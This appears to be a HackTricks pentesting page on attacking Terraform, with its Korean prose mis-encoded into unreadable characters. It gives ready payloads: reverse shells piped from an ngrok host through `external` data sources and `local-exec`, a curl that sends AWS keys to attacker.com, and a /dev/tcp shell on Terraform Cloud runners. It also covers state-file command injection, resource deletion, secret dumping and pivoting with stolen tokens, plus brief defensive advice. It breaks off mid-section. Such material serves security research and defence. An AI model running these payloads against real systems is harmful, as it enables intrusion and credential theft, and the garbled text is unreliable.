# Terraform ë³´ì•ˆ

{{#include ../banners/hacktricks-training.md}}

## ê¸°ë³¸ ì •ë³´

[ë¬¸ì„œì—ì„œ:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraformì€ ì‚¬ëŒì´ ì½ì„ ìˆ˜ ìˆëŠ” êµ¬ì„± íŒŒì¼ì—ì„œ í´ë¼ìš°ë“œ ë° ì˜¨í”„ë ˆë¯¸ìŠ¤ ë¦¬ì†ŒìŠ¤ë¥¼ ì •ì˜í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” ì¸í”„ë¼ë¥¼ ì½”ë“œë¡œ ê´€ë¦¬í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ êµ¬ì„± íŒŒì¼ì€ ë²„ì „ ê´€ë¦¬, ì¬ì‚¬ìš© ë° ê³µìœ ê°€ ê°€ëŠ¥í•˜ë©°, ì¼ê´€ëœ ì›Œí¬í”Œë¡œìš°ë¥¼ ì‚¬ìš©í•´ ì¸í”„ë¼ì˜ ì „ì²´ ìˆ˜ëª…ì£¼ê¸° ë™ì•ˆ í”„ë¡œë¹„ì €ë‹ ë° ê´€ë¦¬ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Terraformì€ compute, storage, networking ê°™ì€ ì €ìˆ˜ì¤€ êµ¬ì„±ìš”ì†Œë¿ë§Œ ì•„ë‹ˆë¼ DNS ì—”íŠ¸ë¦¬ë‚˜ SaaS ê¸°ëŠ¥ ê°™ì€ ê³ ìˆ˜ì¤€ êµ¬ì„±ìš”ì†Œë„ ê´€ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Terraformì€ ì–´ë–»ê²Œ ë™ì‘í•˜ë‚˜ìš”?

Terraformì€ í´ë¼ìš°ë“œ í”Œë«í¼ ë° ê¸°íƒ€ ì„œë¹„ìŠ¤ì˜ APIë¥¼ í†µí•´ ë¦¬ì†ŒìŠ¤ë¥¼ ìƒì„±í•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤. ProvidersëŠ” Terraformì´ ì ‘ê·¼ ê°€ëŠ¥í•œ APIë¥¼ ê°€ì§„ ê±°ì˜ ëª¨ë“  í”Œë«í¼ì´ë‚˜ ì„œë¹„ìŠ¤ì™€ ì‘ë™í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

![](<../images/image (177).png>)

HashiCorpì™€ Terraform ì»¤ë®¤ë‹ˆí‹°ëŠ” ì´ë¯¸ ìˆ˜ì²œ ì¢…ë¥˜ì˜ ë¦¬ì†ŒìŠ¤ì™€ ì„œë¹„ìŠ¤ë¥¼ ê´€ë¦¬í•˜ê¸° ìœ„í•´ **1700ê°œ ì´ìƒì˜ providers**ë¥¼ ì‘ì„±í–ˆìœ¼ë©° ì´ ìˆ˜ëŠ” ê³„ì† ì¦ê°€í•˜ê³  ìˆìŠµë‹ˆë‹¤. ëª¨ë“  ê³µê°œì ìœ¼ë¡œ ì´ìš© ê°€ëŠ¥í•œ providersëŠ” [Terraform Registry](https://registry.terraform.io/)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ì—¬ê¸°ì—ëŠ” Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog ë“± ìˆ˜ë§ì€ ì„œë¹„ìŠ¤ê°€ í¬í•¨ë©ë‹ˆë‹¤.

í•µì‹¬ Terraform ì›Œí¬í”Œë¡œìš°ëŠ” ì„¸ ë‹¨ê³„ë¡œ êµ¬ì„±ë©ë‹ˆë‹¤:

- **Write:** ì—¬ëŸ¬ í´ë¼ìš°ë“œ ì œê³µìì™€ ì„œë¹„ìŠ¤ë¥¼ ê°€ë¡œì§€ë¥´ëŠ” ë¦¬ì†ŒìŠ¤ë¥¼ ì •ì˜í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ VPC ë„¤íŠ¸ì›Œí¬ì˜ ê°€ìƒë¨¸ì‹ ë“¤ì— ë³´ì•ˆ ê·¸ë£¹ê³¼ ë¡œë“œë°¸ëŸ°ì„œë¥¼ í¬í•¨í•´ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë°°í¬í•˜ëŠ” êµ¬ì„±ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **Plan:** Terraformì€ ê¸°ì¡´ ì¸í”„ë¼ì™€ êµ¬ì„±ì— ê¸°ì´ˆí•´ ìƒì„±, ì—…ë°ì´íŠ¸ ë˜ëŠ” ì‚­ì œí•  ì¸í”„ë¼ë¥¼ ì„¤ëª…í•˜ëŠ” ì‹¤í–‰ ê³„íšì„ ë§Œë“­ë‹ˆë‹¤.
- **Apply:** ìŠ¹ì¸ë˜ë©´ Terraformì€ ë¦¬ì†ŒìŠ¤ ì¢…ì†ì„±ì„ ê³ ë ¤í•´ ì œì•ˆëœ ì‘ì—…ì„ ì˜¬ë°”ë¥¸ ìˆœì„œë¡œ ìˆ˜í–‰í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ VPCì˜ ì†ì„±ì„ ì—…ë°ì´íŠ¸í•˜ê³  í•´ë‹¹ VPCì˜ ê°€ìƒë¨¸ì‹  ìˆ˜ë¥¼ ë³€ê²½í•˜ë©´, Terraformì€ ê°€ìƒë¨¸ì‹ ì„ ìŠ¤ì¼€ì¼í•˜ê¸° ì „ì— VPCë¥¼ ì¬ìƒì„±í•©ë‹ˆë‹¤.

![](<../images/image (215).png>)

### Terraform Lab

ì»´í“¨í„°ì— terraformì„ ì„¤ì¹˜í•˜ë©´ ë©ë‹ˆë‹¤.

ì„¤ì¹˜ ê°€ì´ë“œëŠ” [guide]ì— ìˆê³  terraformì„ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ê°€ì¥ ì¢‹ì€ ë°©ë²•ì€ [best way to download terraform]ì— ìˆìŠµë‹ˆë‹¤.

## RCE in Terraform: config file poisoning

Terraformì€ ì›¹í˜ì´ì§€ë‚˜ ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ë¥¼ ë…¸ì¶œí•˜ëŠ” í”Œë«í¼ì´ ì•„ë‹ˆë¯€ë¡œ ì—´ê±°í•  ìˆ˜ ìˆëŠ” ë°©ì‹ì´ ì—†ìŠµë‹ˆë‹¤. ë”°ë¼ì„œ Terraformì„ íƒ€ê¹ƒìœ¼ë¡œ ì‚¼ê¸° ìœ„í•œ ìœ ì¼í•œ ë°©ë²•ì€ **terraform êµ¬ì„± íŒŒì¼ì„ ì¶”ê°€/ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ**ì„ ê°–ê±°ë‚˜, **terraform state íŒŒì¼ì„ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ**ì„ ê°–ëŠ” ê²ƒì…ë‹ˆë‹¤(ì•„ë˜ ì±•í„° ì°¸ì¡°).

ê·¸ëŸ¬ë‚˜ terraformì€ ì œëŒ€ë¡œ ë™ì‘í•˜ê¸° ìœ„í•´ ë‹¤ì–‘í•œ ìœ„ì¹˜ì— ëŒ€í•œ **ê¶Œí•œì´ ë†’ì€ ì ‘ê·¼ ê¶Œí•œ**ì„ ê°€ì§€ë¯€ë¡œ íƒ€ê¹ƒìœ¼ë¡œ ì‚¼ê¸°ì— ë§¤ìš° ë¯¼ê°í•œ êµ¬ì„± ìš”ì†Œì…ë‹ˆë‹¤.

ê³µê²©ìê°€ terraformì´ ì‹¤í–‰ë˜ëŠ” ì‹œìŠ¤í…œì„ ì†ìƒì‹œí‚¤ëŠ” ì£¼ìš” ë°©ë²•ì€ ê²°êµ­ êµ¬ì„± íŒŒì¼ì´ ì–´ëŠ ì‹œì ì—ì„œë“  **í•´ì„(interpreted)** ë  ê²ƒì´ê¸° ë•Œë¬¸ì— **terraform êµ¬ì„±ì„ ì €ì¥í•˜ëŠ” ë¦¬í¬ì§€í† ë¦¬**ë¥¼ íƒˆì·¨í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

ì‹¤ì œë¡œ PRì´ ìƒì„±ëœ í›„ ìë™ìœ¼ë¡œ terraform plan/applyë¥¼ ì‹¤í–‰í•˜ëŠ” ì†”ë£¨ì…˜ë“¤(ì˜ˆ: Atlantis)ì´ ì¡´ì¬í•©ë‹ˆë‹¤:

{{#ref}}
atlantis-security.md
{{#endref}}

terraform íŒŒì¼ì„ íƒˆì·¨í•  ìˆ˜ ìˆë‹¤ë©´ ëˆ„êµ°ê°€ `terraform plan` ë˜ëŠ” `terraform apply`ë¥¼ ì‹¤í–‰í•  ë•Œ RCEë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ì—¬ëŸ¬ ê°€ì§€ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤.

### Terraform plan

Terraform planì€ terraformì—ì„œ **ê°€ì¥ ë§ì´ ì‚¬ìš©ë˜ëŠ” ëª…ë ¹**ì´ë©° ê°œë°œìë‚˜ terraformì„ ì‚¬ìš©í•˜ëŠ” ì†”ë£¨ì…˜ë“¤ì€ ì´ë¥¼ í•­ìƒ í˜¸ì¶œí•©ë‹ˆë‹¤. ë”°ë¼ì„œ **ê°€ì¥ ì‰¬ìš´ RCE ë°©ë²•**ì€ `terraform plan` ì¤‘ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë„ë¡ terraform êµ¬ì„± íŒŒì¼ì„ ì˜¤ì—¼ì‹œí‚¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

**Using an external provider**

Terraformì€ Terraformê³¼ ì™¸ë¶€ í”„ë¡œê·¸ë¨ ê°„ì˜ ì¸í„°í˜ì´ìŠ¤ë¥¼ ì œê³µí•˜ëŠ” [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs)ë¥¼ ì œê³µí•©ë‹ˆë‹¤. `external` data sourceë¥¼ ì‚¬ìš©í•˜ë©´ `plan` ì¤‘ì— ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

terraform êµ¬ì„± íŒŒì¼ì— ë‹¤ìŒê³¼ ê°™ì€ ë‚´ìš©ì„ ì£¼ì…í•˜ë©´ `terraform plan`ì„ ì‹¤í–‰í•  ë•Œ rev shellì´ ì‹¤í–‰ë©ë‹ˆë‹¤:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**ì»¤ìŠ¤í…€ provider ì‚¬ìš©**

ê³µê²©ìëŠ” [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup)ì„ [Terraform Registry](https://registry.terraform.io/)ì— ì œì¶œí•œ ë‹¤ìŒ feature branchì˜ Terraform ì½”ë“œì— ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ ([example from here](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
í”„ë¡œë°”ì´ë”ëŠ” `init`ì—ì„œ ë‹¤ìš´ë¡œë“œë˜ë©° `plan`ì´ ì‹¤í–‰ë  ë•Œ ì•…ì„± ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤

ì˜ˆì œëŠ” [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤

**ì™¸ë¶€ ì°¸ì¡° ì‚¬ìš©**

ìœ„ì—ì„œ ì–¸ê¸‰í•œ ë‘ ì˜µì…˜ì€ ìœ ìš©í•˜ì§€ë§Œ ê·¸ë‹¤ì§€ stealthyí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤(ë‘ ë²ˆì§¸ê°€ ë” stealthyí•˜ì§€ë§Œ ì²« ë²ˆì§¸ë³´ë‹¤ ë” ë³µì¡í•©ë‹ˆë‹¤). ë‹¤ìŒ ì œì•ˆì„ ë”°ë¥´ë©´ ì´ ê³µê²©ì„ ë” **stealthier way**ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- terraform íŒŒì¼ì— rev shellì„ ì§ì ‘ ì¶”ê°€í•˜ëŠ” ëŒ€ì‹ , rev shellì„ í¬í•¨í•˜ëŠ” **ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ ë¡œë“œ**ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
rev shell codeëŠ” [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ì—ì„œ **ref** ê¸°ëŠ¥ì„ ì‚¬ìš©í•´ ë¦¬í¬ì§€í† ë¦¬ì˜ ë¸Œëœì¹˜ ì•ˆì— ìˆëŠ” **terraform rev shell code in a branch**ë¥¼ ìˆ¨ê¸°ì„¸ìš”. ì˜ˆ: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform applyëŠ” ëª¨ë“  ë³€ê²½ì‚¬í•­ì„ ì ìš©í•˜ê¸° ìœ„í•´ ì‹¤í–‰ë©ë‹ˆë‹¤. ë˜í•œ ì´ë¥¼ ì•…ìš©í•´ RCEë¥¼ ì–»ê¸° ìœ„í•´ **a malicious Terraform file with** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
ë‹¤ìŒê³¼ ê°™ì€ í˜ì´ë¡œë“œê°€ `main.tf` íŒŒì¼ì˜ ëì— ìœ„ì¹˜í•˜ë„ë¡ í•˜ë©´ ë©ë‹ˆë‹¤:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
**ì´ì „ ê¸°ë²•ì˜ ê¶Œì¥ ì‚¬í•­**ì„ ë”°ë¥´ê³  ì´ ê³µê²©ì„ **ì™¸ë¶€ ì°¸ì¡°ë¥¼ ì‚¬ìš©í•˜ì—¬ ë” ì€ë°€í•˜ê²Œ ìˆ˜í–‰**í•˜ì„¸ìš”.

## Secrets Dumps

ë‹¤ìŒê³¼ ê°™ì´ terraform íŒŒì¼ì— í•­ëª©ì„ ì¶”ê°€í•˜ë©´ `terraform apply`ë¥¼ ì‹¤í–‰í•  ë•Œ **terraformì—ì„œ ì‚¬ìš©ë˜ëŠ” ë¹„ë°€ ê°’ë“¤ì´ ë¤í”„ë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform State Files ì•…ìš©

In case you have write access over terraform state files but cannot change the terraform code, [**this research**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) gives some interesting options to take advantage of the file. Even if you would have write access over the config files, using the vector of state files is often way more sneaky, since you do not leave tracks in the `git` history.

### RCE in Terraform: config file poisoning

It is possible to [create a custom provider](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) and just replace one of the providers in the terraform state file for the malicious one or add a fake resource referencing the malicious provider.

The provider [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) builds on the research and weaponizes this principle. You can add a fake resource and state the arbitrary bash command you want to run in the attribute `command`. When the `terraform` run is triggered, this will be read and executed in both the `terraform plan` and `terraform apply` steps. In case of the `terraform apply` step, `terraform` will delete the fake resource from the state file after executing your command, cleaning up after itself. More information and a full demo can be found in the [GitHub repository hosting the source code for this provider](https://github.com/offensive-actions/terraform-provider-statefile-rce).

To use it directly, just include the following at any position of the `resources` array and customize the `name` and the `command` attributes:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Then, as soon as `terraform` gets executed, your code will run.

### Deleting resources <a href="#deleting-resources" id="deleting-resources"></a>

ë¦¬ì†ŒìŠ¤ë¥¼ ì‚­ì œí•˜ëŠ” ë°©ë²•ì€ 2ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤:

1. **ìƒíƒœ íŒŒì¼(state file)ì— ë¬´ì‘ìœ„ ì´ë¦„ì˜ ë¦¬ì†ŒìŠ¤ë¥¼ ì‚½ì…í•˜ê³  ì‚­ì œí•˜ë ¤ëŠ” ì‹¤ì œ ë¦¬ì†ŒìŠ¤ë¥¼ ê°€ë¦¬í‚¤ê²Œ í•˜ëŠ” ë°©ë²•**

`terraform`ì´ í•´ë‹¹ ë¦¬ì†ŒìŠ¤ê°€ ì¡´ì¬í•˜ë©´ ì•ˆ ëœë‹¤ê³  íŒë‹¨í•˜ë©´, ì§€ì •ëœ ì‹¤ì œ ë¦¬ì†ŒìŠ¤ IDë¥¼ ë”°ë¼ í•´ë‹¹ ë¦¬ì†ŒìŠ¤ë¥¼ íŒŒê´´í•©ë‹ˆë‹¤(ì§€ì •ëœ ì‹¤ì œ ë¦¬ì†ŒìŠ¤ IDë¥¼ ë”°ë¦„). ì´ì „ í˜ì´ì§€ì˜ ì˜ˆ:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **ì—…ë°ì´íŠ¸ê°€ ë¶ˆê°€ëŠ¥í•˜ë„ë¡ ë¦¬ì†ŒìŠ¤ë¥¼ ìˆ˜ì •í•´ ì‚­ì œ í›„ ì¬ìƒì„±ë˜ê²Œ í•˜ê¸°**

For an EC2 instance, modifying the type of the instance is enough to make terraform delete a recreate it.

### ë¸”ë™ë¦¬ìŠ¤íŠ¸ëœ í”„ë¡œë°”ì´ë” êµì²´

ë§Œì•½ `hashicorp/external`ì´ ë¸”ë™ë¦¬ìŠ¤íŠ¸ì— ì˜¬ë¼ ìˆëŠ” ìƒí™©ì´ ë°œìƒí•˜ë©´, ë‹¤ìŒê³¼ ê°™ì´ `external` í”„ë¡œë°”ì´ë”ë¥¼ ì¬êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì°¸ê³ : ìš°ë¦¬ëŠ” https://registry.terraform.io/providers/nazarewk/external/latestì— ê²Œì‹œëœ external providerì˜ í¬í¬ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì§ì ‘ í¬í¬ë‚˜ ì¬êµ¬í˜„ì„ ê²Œì‹œí•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
ê·¸ëŸ° ë‹¤ìŒ í‰ì†Œì™€ ê°™ì´ `external`ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE and credential exfiltration

ì´ ì‹œë‚˜ë¦¬ì˜¤ëŠ” Terraform Cloud (TFC) runnersë¥¼ speculative plans ë™ì•ˆ ì•…ìš©í•˜ì—¬ ëŒ€ìƒ í´ë¼ìš°ë“œ ê³„ì •ìœ¼ë¡œ í”¼ë²—í•©ë‹ˆë‹¤.

- Preconditions:
- ê°œë°œì ë¨¸ì‹ ì—ì„œ Terraform Cloud í† í°ì„ íƒˆì·¨í•©ë‹ˆë‹¤. CLIëŠ” í† í°ì„ í‰ë¬¸ìœ¼ë¡œ `~/.terraform.d/credentials.tfrc.json`ì— ì €ì¥í•©ë‹ˆë‹¤.
- í† í°ì€ ëŒ€ìƒ organization/workspaceì— ì ‘ê·¼ ê¶Œí•œì´ ìˆìœ¼ë©° ìµœì†Œí•œ `plan` ê¶Œí•œì„ ê°€ì§€ê³  ìˆì–´ì•¼ í•©ë‹ˆë‹¤. VCS-backed workspacesëŠ” CLIì—ì„œ `apply`ë¥¼ ì°¨ë‹¨í•˜ì§€ë§Œ, ì—¬ì „íˆ speculative plansë¥¼ í—ˆìš©í•©ë‹ˆë‹¤.

- TFC APIë¥¼ í†µí•´ workspace ë° VCS ì„¤ì •ì„ í™•ì¸í•©ë‹ˆë‹¤:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- speculative plan ì¤‘ì— external data sourceì™€ Terraform Cloud "cloud" blockì„ ì‚¬ìš©í•˜ì—¬ VCS-backed workspaceë¥¼ ëŒ€ìƒìœ¼ë¡œ code executionì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
TFC runnerì—ì„œ reverse shellì„ ì–»ê¸° ìœ„í•œ ì˜ˆì‹œ rsync.sh:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
í”„ë¡œê·¸ë¨ì„ ephemeral runnerì—ì„œ ì‹¤í–‰í•˜ê¸° ìœ„í•œ ì˜ˆë¹„ ê³„íšì„ ìˆ˜í–‰í•˜ì„¸ìš”:
```bash
terraform init
terraform plan
```
- runnerì—ì„œ ì£¼ì…ëœ cloud credentialsì„ enumerateí•˜ê³  exfiltrateí•©ë‹ˆë‹¤. ì‹¤í–‰ ì¤‘ TFCëŠ” provider credentialsë¥¼ files ë° environment variablesë¥¼ í†µí•´ ì£¼ì…í•©ë‹ˆë‹¤:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
ëŸ¬ë„ˆ ì‘ì—… ë””ë ‰í„°ë¦¬ì—ì„œ ì˜ˆìƒë˜ëŠ” íŒŒì¼:
- GCP:
- `tfc-google-application-credentials` (Workload Identity Federation JSON êµ¬ì„±)
- `tfc-gcp-token` (ë‹¨ê¸°ê°„ ìœ íš¨í•œ GCP ì•¡ì„¸ìŠ¤ í† í°)
- AWS:
- `tfc-aws-shared-config` (web identity/OIDC ì—­í•  ì „í™˜ êµ¬ì„±)
- `tfc-aws-token` (ë‹¨ê¸°ê°„ ìœ íš¨í•œ í† í°; ì¼ë¶€ ì¡°ì§ì€ ì •ì  í‚¤ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŒ)

- ë‹¨ê¸°ê°„ ìê²© ì¦ëª…ì„ out-of-band ë°©ì‹ìœ¼ë¡œ ì‚¬ìš©í•˜ì—¬ VCS ê²Œì´íŠ¸ë¥¼ ìš°íšŒ:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
ì´ëŸ¬í•œ ìê²© ì¦ëª…ì„ í†µí•´ ê³µê²©ìëŠ” ë„¤ì´í‹°ë¸Œ CLIë¥¼ ì‚¬ìš©í•´ ë¦¬ì†ŒìŠ¤ë¥¼ ì§ì ‘ ìƒì„±/ìˆ˜ì •/ì‚­ì œí•  ìˆ˜ ìˆìœ¼ë©°, VCSë¥¼ í†µí•´ `apply`ë¥¼ ì°¨ë‹¨í•˜ëŠ” PR ê¸°ë°˜ ì›Œí¬í”Œë¡œë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- ë°©ì–´ ì§€ì¹¨:
- TFC ì‚¬ìš©ì/íŒ€ê³¼ í† í°ì— ìµœì†Œ ê¶Œí•œì„ ì ìš©í•˜ì„¸ìš”. ë©¤ë²„ì‹­ì„ ê°ì‚¬í•˜ê³  ê³¼ë„í•œ ì†Œìœ ì ê¶Œí•œì„ í”¼í•˜ì„¸ìš”.
- ê°€ëŠ¥í•œ ê²½ìš° ë¯¼ê°í•œ VCS ê¸°ë°˜ ì›Œí¬ìŠ¤í˜ì´ìŠ¤ì—ì„œ `plan` ê¶Œí•œì„ ì œí•œí•˜ì„¸ìš”.
- Sentinel ì •ì±…ìœ¼ë¡œ provider/data source í—ˆìš© ëª©ë¡ì„ ì‹œí–‰í•˜ì—¬ `data "external"` ë˜ëŠ” ì•Œë ¤ì§€ì§€ ì•Šì€ providersë¥¼ ì°¨ë‹¨í•˜ì„¸ìš”. provider í•„í„°ë§ì— ê´€í•œ HashiCorp ì§€ì¹¨ì„ ì°¸ì¡°í•˜ì„¸ìš”.
- ì •ì  í´ë¼ìš°ë“œ ìê²© ì¦ëª…ë³´ë‹¤ OIDC/WIFë¥¼ ì„ í˜¸í•˜ì„¸ìš”; runnersë¥¼ ë¯¼ê° ìì‚°ìœ¼ë¡œ ì·¨ê¸‰í•˜ì„¸ìš”. ì¶”ì¸¡ì  plan ì‹¤í–‰ ë° ì˜ˆìƒì¹˜ ëª»í•œ ì•„ì›ƒë°”ìš´ë“œ íŠ¸ë˜í”½(egress)ì„ ëª¨ë‹ˆí„°ë§í•˜ì„¸ìš”.
- plan ì‹¤í–‰ ì¤‘ `tfc-*` ìê²© ì¦ëª… ì•„í‹°íŒ©íŠ¸ì˜ ìœ ì¶œì„ íƒì§€í•˜ê³  ì˜ì‹¬ìŠ¤ëŸ¬ìš´ `external` í”„ë¡œê·¸ë¨ ì‚¬ìš©ì— ëŒ€í•´ ê²½ê³ ë¥¼ ìƒì„±í•˜ì„¸ìš”.


## Terraform Cloud ì¹¨í•´

### í† í° ì‚¬ìš©

ì´ **[explained in this post](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)** ì—ì„œ ì„¤ëª…í•œ ê²ƒì²˜ëŸ¼, terraform CLIëŠ” í† í°ì„ í‰ë¬¸ìœ¼ë¡œ **`~/.terraform.d/credentials.tfrc.json`**ì— ì €ì¥í•©ë‹ˆë‹¤. ì´ í† í°ì„ íƒˆì·¨í•˜ë©´ ê³µê²©ìëŠ” í† í°ì˜ ë²”ìœ„ ë‚´ì—ì„œ í•´ë‹¹ ì‚¬ìš©ìë¥¼ ê°€ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ í† í°ì„ ì‚¬ìš©í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ org/workspace ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
GET https://app.terraform.io/api/v2/organizations/acmecorp/workspaces/gcp-infra-prod
Authorization: Bearer <TF_TOKEN>
```
ê·¸ëŸ¼ ì´ì „ ì¥ì—ì„œ ì„¤ëª…í•œ ê²ƒì²˜ëŸ¼ **`terraform plan`**ì„ ì‚¬ìš©í•´ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤.

### í´ë¼ìš°ë“œë¡œ ë¹ ì ¸ë‚˜ê°€ê¸°

ë§Œì•½ runnerê°€ ì–´ë–¤ í´ë¼ìš°ë“œ í™˜ê²½ì— ìœ„ì¹˜í•´ ìˆë‹¤ë©´, runnerì— ì—°ê²°ëœ principalì˜ í† í°ì„ íšë“í•˜ì—¬ ì™¸ë¶€ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤.

- **GCP files (í˜„ì¬ ì‹¤í–‰ ì‘ì—… ë””ë ‰í„°ë¦¬ì— ì¡´ì¬)**
- `tfc-google-application-credentials` â€” ì™¸ë¶€ ì•„ì´ë´í‹°í‹°ë¥¼ êµí™˜í•˜ëŠ” ë°©ë²•ì„ Googleì— ì•Œë ¤ì£¼ëŠ” Workload Identity Federation(WIF)ìš© JSON êµ¬ì„±.
- `tfc-gcp-token` â€” ìœ„ì—ì„œ ì°¸ì¡°ëœ ë‹¨ê¸°(â‰ˆ1 hour) GCP ì•¡ì„¸ìŠ¤ í† í°.

- **AWS files**
- `tfc-aws-shared-config` â€” web identity federation/OIDC role assumptionì„ ìœ„í•œ JSON (ì •ì  í‚¤ë³´ë‹¤ ê¶Œì¥ë¨).
- `tfc-aws-token` â€” ë‹¨ê¸° í† í°, ë˜ëŠ” ì˜ëª» êµ¬ì„±ëœ ê²½ìš° ì •ì  IAM í‚¤ì¼ ìˆ˜ ìˆìŒ.


## Automatic Audit Tools

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

SnykëŠ” Terraform, CloudFormation, Kubernetes ë° ê¸°íƒ€ IaC í¬ë§·ì˜ ì·¨ì•½ì ê³¼ ì˜ëª»ëœ êµ¬ì„±ì„ íƒì§€í•˜ëŠ” í¬ê´„ì ì¸ Infrastructure as Code (IaC) ìŠ¤ìºë‹ ì†”ë£¨ì…˜ì„ ì œê³µí•œë‹¤.

- **ê¸°ëŠ¥:**
